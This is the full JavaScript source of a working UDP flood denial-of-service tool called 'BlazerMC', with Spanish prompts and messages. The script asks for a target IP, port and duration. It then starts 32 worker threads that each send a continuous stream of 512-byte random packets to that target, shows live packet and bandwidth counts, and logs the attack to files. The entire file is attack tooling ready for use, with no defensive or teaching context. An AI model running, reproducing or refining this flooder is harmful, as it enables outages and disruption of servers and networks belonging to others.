import chalk from 'chalk';
import readline from 'readline';
import fs from 'fs';
import { Worker, isMainThread, parentPort, workerData } from 'worker_threads';
import dgram from 'dgram';

const numThreads = 32;

const banner = `
██████╗░██╗░░░░░░█████╗░███████╗███████╗██████╗░███╗░░░███╗░█████╗░
██╔══██╗██║░░░░░██╔══██╗╚════██║██╔════╝██╔══██╗████╗░████║██╔══██╗
██████╦╝██║░░░░░███████║░░███╔═╝█████╗░░██████╔╝██╔████╔██║██║░░╚═╝
██╔══██╗██║░░░░░██╔══██║██╔══╝░░██╔══╝░░██╔══██╗██║╚██╔╝██║██║░░██╗
██████╦╝███████╗██║░░██║███████╗███████╗██║░░██║██║░╚═╝░██║╚█████╔╝
╚═════╝░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚════╝░
`;

const center = str => {
  const w = process.stdout.columns || 80;
  return str.split('\n').map(line =>
    ' '.repeat(Math.max(0, Math.floor((w - line.length) / 2))) + chalk.greenBright.bold(line)
  ).join('\n');
};

const loadingAnimation = async (text, time = 3000) => {
  const frames = ['⠋','⠙','⠸','⢰','⣠','⣄','⡆','⡃','⠇'];
  let i = 0;
  const start = Date.now();
  while (Date.now() - start < time) {
    process.stdout.write(`\r${chalk.cyan(frames[i++ % frames.length])} ${chalk.white(text)}   `);
    await new Promise(res => setTimeout(res, 100));
  }
  process.stdout.write('\r✅ Preparado para la detonación.\n');
};

if (isMainThread) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

  console.clear();
  console.log(center(banner), '\n');

  rl.question(chalk.cyan('IP destino: '), ip => {
    rl.question(chalk.cyan('Puerto destino: '), port => {
      rl.question(chalk.cyan('Duración en segundos: '), async seconds => {
        await loadingAnimation('Inicializando BlazerMC');

        const start = Date.now();
        const stats = Array(numThreads).fill(null);
        let totalPackets = 0;

        fs.writeFileSync('envios.txt', `📍 Envío a ${ip}:${port} por ${seconds}s con ${numThreads} hilos\n`);
        fs.writeFileSync('log.txt', '');

        for (let i = 0; i < numThreads; i++) {
          const worker = new Worker(new URL(import.meta.url), {
            workerData: { host: ip, port: +port, duration: +seconds, id: i }
          });

          worker.on('message', msg => {
            if (msg.type === 'stats') totalPackets += msg.count;
            if (msg.type === 'done') {
              stats[i] = msg.count;
              fs.appendFileSync('log.txt', `HILO ${i} - ${msg.count} paquetes enviados\n`);
            }
          });

          worker.on('error', () => {
            stats[i] = -1;
            fs.appendFileSync('log.txt', `HILO ${i} - ❌ Error\n`);
          });
        }

        const interval = setInterval(() => {
          const elapsed = (Date.now() - start) / 1000;
          const remaining = Math.max(0, +seconds - Math.floor(elapsed));
          const pps = (totalPackets / elapsed).toFixed(0);
          const mbps = ((totalPackets * 512 * 8) / 1e6 / elapsed).toFixed(2);

          console.clear();
          console.log(center(banner), '\n');
          console.log(chalk.whiteBright(`🌐 IP: ${ip} | Puerto: ${port} | Tiempo restante: ${remaining}s`));
          console.log(chalk.white(`📈 PPS: ${pps} | Mbps: ${mbps} | Total: ${totalPackets}`));
        }, 1000);

        setTimeout(() => {
          clearInterval(interval);
          console.clear();
          console.log(center(banner), '\n');
          console.log(chalk.yellow.bold('\n📦 RESUMEN FINAL DE LOS HILOS:\n'));
          stats.forEach((c, i) => {
            const tag = `HILO ${i.toString().padStart(2, '0')}`;
            if (c === null) console.log(chalk.gray(`[${tag}] sin respuesta`));
            else if (c === -1) console.log(chalk.red(`[${tag}] ❌ Error`));
            else console.log(chalk.green(`[${tag}] ✅ ${c} paquetes`));
          });
          console.log('\n', chalk.greenBright('✔ Envío completo. Revisa log.txt y envios.txt ✔'));
          rl.close();
        }, +seconds * 1000 + 1000);
      });
    });
  });
} else {
  const client = dgram.createSocket('udp4');
  let sent = 0;
  const end = Date.now() + workerData.duration * 1000;

  const send = () => {
    if (Date.now() >= end) {
      parentPort.postMessage({ type: 'done', count: sent });
      client.close();
      return;
    }
    const msg = Buffer.alloc(512, Math.floor(Math.random() * 256));
    client.send(msg, workerData.port, workerData.host);
    sent++;
    setImmediate(send);
  };

  send();
  setInterval(() => {
    parentPort.postMessage({ type: 'stats', count: sent });
  }, 1000);
}